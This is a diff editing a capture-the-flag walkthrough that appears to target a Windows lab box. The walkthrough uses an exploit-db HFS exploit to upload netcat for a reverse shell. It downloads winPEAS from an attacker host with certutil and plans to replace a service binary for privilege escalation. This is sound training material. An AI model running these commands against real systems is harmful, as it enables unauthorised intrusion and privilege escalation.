@@ -64,7 +64,6 @@ We will begin by searching for an exploit in the exploitdb:
 
 We will use the 39161.py one. Let's download it: `searchsploit -p windows/remote/39161.py`
 ![](https://github.com/user-attachments/assets/f95e68c9-9f97-4865-b832-184ec411b25c)
-
 In the exploit we only need to change the IP and the LPORT to make it work.
 
 In another terminal we will open a server hosting a `netcat.exe` file named as `nc.exe`
@@ -73,16 +72,16 @@ We need to run this exploit twice, one to upload the `nc.exe` file and one to es
 First run:
 ![](https://github.com/user-attachments/assets/71d00b6e-c8a3-4aa2-8762-6f88d6b7e9dd)
 
+Second run:
 ![](https://github.com/user-attachments/assets/f1ca4ff2-63b1-4b8f-ac92-5cb07ad0a277)
 
 Now that we're in, we will upload `winpeas` to do some enumeration:
-We will again open a server hosting the file and use `certutil` to download it:
+We will again open a server hosting the file and use `certutil` to download it: `certutil -f -split -urlcache http://xx.xx.xx.xx:<PORT>/winPEASany.exe winPEAS.exe
 ![](https://github.com/user-attachments/assets/7c432bc9-ffba-4a47-9314-d996eb3d1f1d)
 
 Now it's time to fire it up:
 `.\winPEAS.exe servicesinfo`
 ![](https://github.com/user-attachments/assets/d8a33f37-e2da-4b5c-9fea-c98b3047c7b1)
-
 And as predicted, winpeas found our ASC privesc vuln.
 
 Now we will use `certutil` again to download and substitute the original ASCService.exe with our payload, after we have stopped the service: `sc stop AdvancedSystemCareService9`
